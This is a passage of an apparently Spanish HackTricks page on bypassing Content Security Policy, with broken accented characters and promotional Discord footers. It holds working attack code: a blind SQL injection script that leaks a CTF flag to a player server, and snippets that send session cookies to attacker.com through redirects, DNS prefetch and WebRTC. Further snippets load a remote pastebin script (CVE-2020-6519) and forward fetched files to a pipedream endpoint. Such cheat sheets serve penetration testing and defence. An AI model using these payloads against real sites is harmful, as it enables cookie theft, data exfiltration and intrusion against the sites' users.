<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### A trav√©s de Bookmarklets

Este ataque implicar√≠a algo de ingenier√≠a social donde el atacante **convince al usuario de arrastrar y soltar un enlace sobre el bookmarklet del navegador**. Este bookmarklet contendr√≠a **c√≥digo javascript malicioso** que, al ser arrastrado y soltado o clicado, se ejecutar√≠a en el contexto de la ventana web actual, **eludiendo CSP y permitiendo robar informaci√≥n sensible** como cookies o tokens.

Para m√°s informaci√≥n [**consulta el informe original aqu√≠**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### Bypass de CSP restringiendo CSP

En [**este informe de CTF**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP se elude inyectando dentro de un iframe permitido un CSP m√°s restrictivo que no permit√≠a cargar un archivo JS espec√≠fico que, luego, a trav√©s de **contaminaci√≥n de prototipos** o **dom clobbering** permit√≠a **abusar de un script diferente para cargar un script arbitrario**.

Puedes **restringir un CSP de un Iframe** con el **atributo `csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

En [**este informe de CTF**](https://github.com/aszx87410/ctf-writeups/issues/48), fue posible a trav√©s de **inyecci√≥n HTML** **restringir** m√°s un **CSP** de modo que un script que preven√≠a CSTI fue deshabilitado y, por lo tanto, la **vulnerabilidad se volvi√≥ explotable.**\
CSP se puede hacer m√°s restrictivo utilizando **etiquetas meta HTML** y los scripts en l√≠nea pueden deshabilitarse **eliminando** la **entrada** que permite su **nonce** y **habilitar scripts en l√≠nea espec√≠ficos a trav√©s de sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### Exfiltraci√≥n de JS con Content-Security-Policy-Report-Only

Si logras que el servidor responda con el encabezado **`Content-Security-Policy-Report-Only`** con un **valor controlado por ti** (quiz√°s debido a un CRLF), podr√≠as hacer que apunte a tu servidor y si **envuelves** el **contenido JS** que deseas exfiltrar con **`<script>`** y dado que es muy probable que `unsafe-inline` no est√© permitido por la CSP, esto **activar√° un error de CSP** y parte del script (que contiene la informaci√≥n sensible) ser√° enviada al servidor desde `Content-Security-Policy-Report-Only`.

Para un ejemplo [**consulta este informe de CTF**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Filtrando Informaci√≥n con CSP e Iframe

* Se crea un `iframe` que apunta a una URL (llam√©mosla `https://example.redirect.com`) que est√° permitida por CSP.
* Esta URL luego redirige a una URL secreta (por ejemplo, `https://usersecret.example2.com`) que **no est√° permitida** por CSP.
* Al escuchar el evento `securitypolicyviolation`, se puede capturar la propiedad `blockedURI`. Esta propiedad revela el dominio de la URI bloqueada, filtrando el dominio secreto al que la URL inicial redirigi√≥.

Es interesante notar que navegadores como Chrome y Firefox tienen comportamientos diferentes al manejar iframes con respecto a CSP, lo que lleva a una posible filtraci√≥n de informaci√≥n sensible debido a un comportamiento indefinido.

Otra t√©cnica implica explotar el CSP mismo para deducir el subdominio secreto. Este m√©todo se basa en un algoritmo de b√∫squeda binaria y en ajustar el CSP para incluir dominios espec√≠ficos que est√°n deliberadamente bloqueados. Por ejemplo, si el subdominio secreto est√° compuesto de caracteres desconocidos, se pueden probar iterativamente diferentes subdominios modificando la directiva CSP para bloquear o permitir estos subdominios. Aqu√≠ hay un fragmento que muestra c√≥mo podr√≠a configurarse el CSP para facilitar este m√©todo:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Al monitorear qu√© solicitudes son bloqueadas o permitidas por el CSP, se puede reducir los posibles caracteres en el subdominio secreto, eventualmente descubriendo la URL completa.

Ambos m√©todos explotan las sutilezas de la implementaci√≥n y el comportamiento del CSP en los navegadores, demostrando c√≥mo pol√≠ticas aparentemente seguras pueden inadvertidamente leak informaci√≥n sensible.

Truco de [**aqu√≠**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

¬°√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de bugs!

**Perspectivas de Hacking**\
Participa en contenido que profundiza en la emoci√≥n y los desaf√≠os del hacking

**Noticias de Hackeo en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking de ritmo r√°pido a trav√©s de noticias e informaci√≥n en tiempo real

**√öltimos Anuncios**\
Mantente informado sobre los nuevos bug bounties que se lanzan y actualizaciones cruciales de la plataforma

¬°√önete a nosotros en [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy!

## Tecnolog√≠as Inseguras para Bypass CSP

### Errores de PHP cuando hay demasiados par√°metros

Seg√∫n la [**√∫ltima t√©cnica comentada en este video**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), enviar demasiados par√°metros (1001 par√°metros GET aunque tambi√©n se puede hacer con par√°metros POST y m√°s de 20 archivos). Cualquier **`header()`** definido en el c√≥digo web de PHP **no ser√° enviado** debido al error que esto provocar√°.

### Sobrecarga del b√∫fer de respuesta de PHP

Se sabe que PHP **almacena en b√∫fer la respuesta a 4096** bytes por defecto. Por lo tanto, si PHP muestra una advertencia, al proporcionar **suficiente informaci√≥n dentro de las advertencias**, la **respuesta** ser√° **enviada** **antes** del **header CSP**, causando que el header sea ignorado.\
Entonces, la t√©cnica consiste b√°sicamente en **llenar el b√∫fer de respuesta con advertencias** para que el header CSP no sea enviado.

Idea de [**este writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Reescribir P√°gina de Error

De [**este writeup**](https://blog.ssrf.kr/69) parece que era posible eludir una protecci√≥n CSP cargando una p√°gina de error (potencialmente sin CSP) y reescribiendo su contenido.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME es una t√©cnica que abusa de un XSS (o XSS altamente limitado) **en un endpoint de una p√°gina** para **abusar** **de otros endpoints de la misma origen.** Esto se hace cargando el endpoint vulnerable desde una p√°gina del atacante y luego actualizando la p√°gina del atacante al endpoint real en la misma origen que deseas abusar. De esta manera, el **endpoint vulnerable** puede usar el objeto **`opener`** en la **carga √∫til** para **acceder al DOM** del **endpoint real a abusar**. Para m√°s informaci√≥n, consulta:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Adem√°s, **wordpress** tiene un **endpoint JSONP** en `/wp-json/wp/v2/users/1?_jsonp=data` que **reflejar√°** los **datos** enviados en la salida (con la limitaci√≥n de solo letras, n√∫meros y puntos).

Un atacante puede abusar de ese endpoint para **generar un ataque SOME** contra WordPress y **incrustarlo** dentro de `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` ten en cuenta que este **script** ser√° **cargado** porque est√° **permitido por 'self'**. Adem√°s, y porque WordPress est√° instalado, un atacante podr√≠a abusar del **ataque SOME** a trav√©s del **endpoint** **callback** **vulnerable** que **elude el CSP** para dar m√°s privilegios a un usuario, instalar un nuevo plugin...\
Para m√°s informaci√≥n sobre c√≥mo realizar este ataque, consulta [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Bypasses de Exfiltraci√≥n CSP

Si hay un CSP estricto que no te permite **interactuar con servidores externos**, hay algunas cosas que siempre puedes hacer para exfiltrar la informaci√≥n.

### Ubicaci√≥n

Podr√≠as simplemente actualizar la ubicaci√≥n para enviar al servidor del atacante la informaci√≥n secreta:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta tag

Podr√≠as redirigir inyectando una etiqueta meta (esto es solo una redirecci√≥n, esto no filtrar√° contenido)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

Para cargar p√°ginas m√°s r√°pido, los navegadores van a pre-resolver nombres de host en direcciones IP y almacenarlas en cach√© para su uso posterior.\
Puedes indicar a un navegador que pre-resuelva un nombre de host con: `<link rel="dns-prefetch" href="something.com">`

Podr√≠as abusar de este comportamiento para **exfiltrar informaci√≥n sensible a trav√©s de solicitudes DNS**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
Otra forma:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Para evitar que esto suceda, el servidor puede enviar el encabezado HTTP:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Aparentemente, esta t√©cnica no funciona en navegadores sin cabeza (bots)
{% endhint %}

### WebRTC

En varias p√°ginas puedes leer que **WebRTC no verifica la pol√≠tica `connect-src`** del CSP.

En realidad, puedes _leak_ informaci√≥n utilizando una _solicitud DNS_. Revisa este c√≥digo:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Otra opci√≥n:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Comprobando pol√≠ticas CSP en l√≠nea

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Creando CSP autom√°ticamente

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Referencias

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

‚Äã

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de bugs.

**Perspectivas de Hacking**\
Participa en contenido que profundiza en la emoci√≥n y los desaf√≠os del hacking

**Noticias de Hackeo en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking de ritmo r√°pido a trav√©s de noticias e informaci√≥n en tiempo real

**√öltimos Anuncios**\
Mantente informado sobre las nuevas recompensas por bugs que se lanzan y actualizaciones cruciales de la plataforma

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy mismo!

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
